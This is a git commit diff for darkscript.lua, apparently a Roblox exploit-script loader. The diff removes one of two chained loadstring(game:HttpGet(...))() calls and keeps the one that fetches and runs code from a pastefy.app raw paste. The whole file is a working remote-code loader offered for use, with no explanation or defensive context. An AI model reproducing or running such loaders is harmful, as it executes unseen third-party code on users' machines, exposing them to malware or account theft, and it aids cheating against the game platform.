18343c88fa3859588b9effe64f012dc6d1f3808e
scriptspawn <rayqutie@gmail.com>
2025-07-20 13:01:17 +0800

    darkscript.lua

--- darkscript.lua
+++ darkscript.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://pastefy.app/sUmyxTLu/raw"))()loadstring(game:HttpGet("https://raw.githubusercontent.com/ZusumeHub/ZusumeHub/refs/heads/main/UpdateZysume"))()
+loadstring(game:HttpGet("https://pastefy.app/sUmyxTLu/raw"))()
